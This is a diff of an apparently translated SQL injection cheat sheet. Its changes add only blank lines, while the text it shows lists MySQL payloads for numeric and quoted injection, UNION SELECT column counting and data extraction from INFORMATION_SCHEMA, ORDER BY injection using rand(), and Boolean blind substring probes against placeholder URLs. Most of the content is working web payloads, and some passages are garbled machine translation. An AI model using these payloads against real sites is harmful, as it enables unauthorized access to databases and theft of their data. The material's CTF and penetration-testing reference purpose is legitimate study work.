@@ -108,55 +108,97 @@ Assumptions are: www.test.com/chybeta.php?id=1
 Numeric injection
 
 chybeta.php?id=1+1
+
 chybeta.php?id=-1 or 1=1
+
 chybeta.php?id=-1 or 10-2=8
+
 chybeta.php?id=1 and 1=2
+
 chybeta.php?id=1 and 1=1
+
 Character injection
+
 The parameters are surrounded by quotes, we need to close the quotes.
+
 chybeta.php?id=1'
+
 chybeta.php?id=1"
+
 chybeta.php?id=1' and '1'='1
+
 chybeta.php?id=1" and "1"="1
+
 Joint inquiry
+
 Query the number of columns
+
 With UNION SELECT injection, if the data to be noted later out of the column with the original number of data columns, it will fail. So need to guess the number of columns.
+
 UNION SELECT
+
 UNION SELECT 1,2,3 #
+
 UNION ALL SELECT 1,2,3 #
+
 UNION ALL SELECT null,null,null #
+
 ORDER BY
+
 Use dichotomy
+
 ORDER BY 10 #
+
 ORDER BY 5  #
+
 ORDER BY 2  #
+
 ....
 Query the database
+
 UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA #
+
 Query table name
+
 UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #
+
 Assuming to obtain the database name "databasename", its hexadecimal encoding 0x64617461626173656e616d65.
+
 UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64617461626173656e616d65 #
+
 Query column name
+
 Obtained from the previous step to the table named tablename, its hexadecimal code obtained
+
 UNION SELECT GROUP_CONCAT(column_name SEPARATOR+0x3c62723e) FROM+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7461626c656e616d65 #
+
 retrieve data
+
 UNION SELECT GROUP_CONCAT(column_1,column_2 SEPARATOR+0x3c62723e) FROM databasename.tablename #
+
 insert / update / delete injection
+
 Reference: SQL Injection in Insert Update and Delete Statements Assuming the background statement is:
+
 insert into user(id,name,pass) values (1,"chybeta","123456");
+
 order by after injection
+
 This part finishing self- sleepy Dragon: MySql injection science popularize by the sort statement, so you can use the conditional statements to make judgments, according to the return of the different sorts of results to determine the true and false conditions.
+
 Detection method
 Generally with oder or orderby variables is likely to be such an injection, when you know a field can be injected as follows:
 Original link: http://www.test.com/list.php?order=vote Sort according to the vote field.
+
 Find the largest number of votes to vote num Then construct the following link to see whether the sort of change. :
 list.php?order=abs(vote-(length(user())>0)*num)+asc
+
 Another method does not need to know any field information, use the rand function:
 list.php?order=rand(true)
 list.php?order=rand(false)
 The above two will return a different sort.
 payload
+
 The statement to determine whether the first character in the table name is less than 128 is as follows:
 http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))
 Error injection
@@ -166,6 +208,7 @@ In many cases, through the previous test will find the page did not echo the ext
 The correct / wrong statement makes the page have a moderate change. You can try using Boolean injection
 The correct statement returns the normal page, the wrong statement returns the common error page. You can try using Boolean injection.
 Submit the wrong statement, does not affect the normal output of the page. Try using delayed injection.
+
 Several simple sentences to judge, in the real need to change according to the situation:
 CASE
 IF ()
@@ -190,6 +233,7 @@ payload
 ' OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) < j #
 
 ...
+
 script
 Script use, visible: ctf blind using script points:
 Pay attention to the coding problem
